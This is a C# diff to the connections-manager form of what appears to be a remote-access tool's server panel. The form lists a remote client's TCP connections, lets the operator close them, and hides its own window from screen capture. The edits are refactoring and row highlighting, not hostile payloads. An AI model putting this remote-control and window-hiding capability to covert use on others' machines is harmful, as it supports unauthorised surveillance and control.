@@ -6,70 +6,60 @@ using Pulsar.Server.Messages;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
+using System.Net;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
 {
     public partial class FrmConnections : Form
     {
-        /// <summary>
-        /// The client which can be used for the connections manager.
-        /// </summary>
         private readonly Client _connectClient;
-
-        /// <summary>
-        /// The message handler for handling the communication with the client.
-        /// </summary>
         private readonly TcpConnectionsHandler _connectionsHandler;
+        private readonly Dictionary<string, ListViewGroup> _groups = new();
+        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new();
 
-        /// <summary>
-        /// 
-        /// </summary>
-        private readonly Dictionary<string, ListViewGroup> _groups = new Dictionary<string, ListViewGroup>();
+        // Store client's local IP and port for highlight comparison
+        private readonly string _clientAddress;
+        private readonly int _clientPort;
 
-        /// <summary>
-        /// Holds the opened connections manager form for each client.
-        /// </summary>
-        private static readonly Dictionary<Client, FrmConnections> OpenedForms = new Dictionary<Client, FrmConnections>();
-
-        /// <summary>
-        /// Creates a new connections manager form for the client or gets the current open form, if there exists one already.
-        /// </summary>
-        /// <param name="client">The client used for the connections manager form.</param>
-        /// <returns>
-        /// Returns a new connections manager form for the client if there is none currently open, otherwise creates a new one.
-        /// </returns>
         public static FrmConnections CreateNewOrGetExisting(Client client)
         {
             if (OpenedForms.ContainsKey(client))
-            {
                 return OpenedForms[client];
-            }
-            FrmConnections f = new FrmConnections(client);
+
+            FrmConnections f = new(client);
             f.Disposed += (sender, args) => OpenedForms.Remove(client);
             OpenedForms.Add(client, f);
             return f;
         }
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="FrmConnections"/> class using the given client.
-        /// </summary>
-        /// <param name="client">The client used for the connections manager form.</param>
         public FrmConnections(Client client)
         {
             _connectClient = client;
             _connectionsHandler = new TcpConnectionsHandler(client);
 
+            // Safely parse the endpoint info if available
+            // Adjust these lines if your Client model uses different properties (like client.IP)
+            var endPoint = client.EndPoint as IPEndPoint;
+            if (endPoint != null)
+            {
+                _clientAddress = endPoint.Address.ToString();
+                _clientPort = endPoint.Port;
+            }
+            else
+            {
+                _clientAddress = string.Empty;
+                _clientPort = -1;
+            }
+
             RegisterMessageHandler();
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
-        /// <summary>
-        /// Registers the connections manager message handler for client communication.
-        /// </summary>
         private void RegisterMessageHandler()
         {
             _connectClient.ClientState += ClientDisconnected;
@@ -77,9 +67,6 @@ namespace Pulsar.Server.Forms
             MessageHandler.Register(_connectionsHandler);
         }
 
-        /// <summary>
-        /// Unregisters the connections manager message handler.
-        /// </summary>
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_connectionsHandler);
@@ -87,42 +74,52 @@ namespace Pulsar.Server.Forms
             _connectClient.ClientState -= ClientDisconnected;
         }
 
-        /// <summary>
-        /// Called whenever a client disconnects.
-        /// </summary>
-        /// <param name="client">The client which disconnected.</param>
-        /// <param name="connected">True if the client connected, false if disconnected</param>
         private void ClientDisconnected(Client client, bool connected)
         {
             if (!connected)
-            {
                 this.Invoke((MethodInvoker)this.Close);
-            }
         }
 
-        /// <summary>
-        /// Called whenever a TCP connection changed.
-        /// </summary>
-        /// <param name="sender">The message handler which raised the event.</param>
-        /// <param name="connections">The current TCP connections of the client.</param>
         private void TcpConnectionsChanged(object sender, TcpConnection[] connections)
         {
+            if (InvokeRequired)
+            {
+                Invoke(new Action<object, TcpConnection[]>(TcpConnectionsChanged), sender, connections);
+                return;
+            }
+
+            lstConnections.BeginUpdate();
             lstConnections.Items.Clear();
 
             foreach (var con in connections)
             {
                 string state = con.State.ToString();
 
-                ListViewItem lvi = new ListViewItem(new[]
+                ListViewItem lvi = new(new[]
                 {
-                    con.ProcessName, con.LocalAddress, con.LocalPort.ToString(),
-                    con.RemoteAddress, con.RemotePort.ToString(), state
+                    con.ProcessName,
+                    con.LocalAddress,
+                    con.LocalPort.ToString(),
+                    con.RemoteAddress,
+                    con.RemotePort.ToString(),
+                    state
                 });
+
+                // ✅ Highlight the row matching this client's IP and Port
+                // ✅ Softer green highlight for client's own connection
+                if (!string.IsNullOrEmpty(_clientAddress) &&
+                    string.Equals(con.LocalAddress, _clientAddress, StringComparison.OrdinalIgnoreCase) &&
+                    con.LocalPort == _clientPort)
+                {
+                    lvi.BackColor = Color.MediumSeaGreen; // softer lime tone
+                    lvi.ForeColor = Color.White;
+                    lvi.Font = new Font(lstConnections.Font, FontStyle.Bold);
+                }
+
 
                 if (!_groups.ContainsKey(state))
                 {
-                    // create new group if not exists already
-                    ListViewGroup g = new ListViewGroup(state, state);
+                    ListViewGroup g = new(state, state);
                     lstConnections.Groups.Add(g);
                     _groups.Add(state, g);
                 }
@@ -130,6 +127,8 @@ namespace Pulsar.Server.Forms
                 lvi.Group = lstConnections.Groups[state];
                 lstConnections.Items.Add(lvi);
             }
+
+            lstConnections.EndUpdate();
         }
 
         private void FrmConnections_Load(object sender, EventArgs e)
@@ -154,15 +153,17 @@ namespace Pulsar.Server.Forms
 
             foreach (ListViewItem lvi in lstConnections.SelectedItems)
             {
-                _connectionsHandler.CloseTcpConnection(lvi.SubItems[1].Text, ushort.Parse(lvi.SubItems[2].Text),
-                    lvi.SubItems[3].Text, ushort.Parse(lvi.SubItems[4].Text));
+                _connectionsHandler.CloseTcpConnection(
+                    lvi.SubItems[1].Text,
+                    ushort.Parse(lvi.SubItems[2].Text),
+                    lvi.SubItems[3].Text,
+                    ushort.Parse(lvi.SubItems[4].Text));
+
                 modified = true;
             }
 
             if (modified)
-            {
                 _connectionsHandler.RefreshTcpConnections();
-            }
         }
 
         private void lstConnections_ColumnClick(object sender, ColumnClickEventArgs e)
